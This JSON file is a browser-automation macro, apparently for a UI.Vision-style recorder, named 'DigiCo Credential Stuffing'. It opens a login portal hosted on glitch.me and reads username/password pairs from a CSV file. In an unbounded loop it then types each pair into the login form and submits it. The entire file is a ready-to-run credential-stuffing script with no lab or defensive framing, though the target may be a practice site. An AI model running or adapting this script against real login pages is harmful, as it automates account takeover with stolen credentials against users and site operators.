{
  "Name": "DigiCo Credential Stuffing",
  "CreationDate": "2022-5-5",
  "Commands": [
    {
      "Command": "open",
      "Target": "https://digico-web-portal.glitch.me/",
      "Value": "",
      "Description": ""
    },
    {
      "Command": "pause",
      "Target": "1000",
      "Value": "",
      "Description": ""
    },
    {
      "Command": "csvRead",
      "Target": "credentialsfile.csv",
      "Value": "",
      "Description": ""
    },
    {
      "Command": "click",
      "Target": "id=login-button",
      "Value": "",
      "Description": ""
    },
    {
      "Command": "pause",
      "Target": "2000",
      "Value": "",
      "Description": ""
    },
    {
      "Command": "executeScript",
      "Target": "return Number (2)",
      "Value": "currentRow",
      "Description": ""
    },
    {
      "Command": "while_v2",
      "Target": "true",
      "Value": "",
      "Description": ""
    },
    {
      "Command": "store",
      "Target": "${currentRow}",
      "Value": "!CSVREADLINENUMBER",
      "Description": ""
    },
    {
      "Command": "csvRead",
      "Target": "credentialsfile.csv",
      "Value": "",
      "Description": ""
    },
    {
      "Command": "type",
      "Target": "name=username",
      "Value": "${!COL1}",
      "Description": ""
    },
    {
      "Command": "type",
      "Target": "id=password",
      "Value": "${!COL2}",
      "Description": ""
    },
    {
      "Command": "click",
      "Target": "id=login-submit",
      "Value": "",
      "Description": ""
    },
    {
      "Command": "pause",
      "Target": "1500",
      "Value": "",
      "Description": ""
    },
    {
      "Command": "executeScript",
      "Target": "return ${currentRow} + 1",
      "Value": "currentRow",
      "Description": ""
    },
    {
      "Command": "end",
      "Target": "",
      "Value": "",
      "Description": ""
    }
  ]
}